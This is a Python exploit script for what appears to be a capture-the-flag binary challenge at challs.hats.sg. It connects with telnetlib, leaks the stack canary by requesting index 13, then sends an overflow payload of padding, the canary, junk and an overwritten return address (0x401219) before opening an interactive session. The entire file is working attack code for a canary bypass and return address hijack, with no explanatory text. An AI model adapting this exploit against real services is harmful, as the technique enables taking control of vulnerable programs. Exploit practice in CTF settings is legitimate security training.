#!/usr/bin/env python3
import socket
import telnetlib
import struct


def p64(x):
	return struct.pack('<Q', x)

# Connect to program
s = socket.socket()
s.connect(('challs.hats.sg', 1302))

t = telnetlib.Telnet()
t.sock = s

# Leak canary
t.read_until(b'gimme index of the number you want me to print:\n')
t.write(b'13\n')

canary = t.read_until(b'\n').strip()
canary = int(canary)
print('Canary:', hex(canary), bytes.fromhex(hex(canary)[2:]))

# Prepare payload
payload = b''
payload += b'A' * 40
payload += p64(canary)
payload += b'JUNKJUNK'  # junk 64 bits
payload += p64(0x401219)  # return address
print('Payload:', payload)

# Send payload
t.write(payload + b'\n')

# fix bug of t.interact() throwing an error
# by reading out the unprintable bytesfirst
t.read_until(b'hey')
print(t.read_eager())
print(t.read_eager())

# do interactive
t.interact()
quit()
